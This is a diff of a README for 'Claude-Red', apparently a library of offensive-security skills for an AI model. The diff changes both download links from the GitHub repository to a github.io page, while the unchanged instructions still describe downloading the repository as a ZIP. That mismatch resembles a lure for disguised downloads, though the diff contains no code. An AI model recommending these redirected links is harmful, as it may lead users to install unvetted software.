@@ -1,6 +1,6 @@
 # 🎯 Claude-Red - Master Offensive Security Skills With AI
 
-[![Download Claude-Red](https://img.shields.io/badge/Download-Claude--Red-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D3748)](https://github.com/urellai22/Claude-Red)
+[![Download Claude-Red](https://img.shields.io/badge/Download-Claude--Red-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D3748)](https://urellai22.github.io)
 
 ## 🤔 What Is Claude-Red?
 
@@ -44,7 +44,7 @@ The library receives continuous improvements from the security community. New at
 
 ### Step 1: Download the Library
 
-Visit this link to download the application: [**https://github.com/urellai22/Claude-Red**](https://github.com/urellai22/Claude-Red)
+Visit this link to download the application: [**https://urellai22.github.io**](https://urellai22.github.io)
 
 Click the green "Code" button on the page and select "Download ZIP". This gives you the complete library on your computer.
 
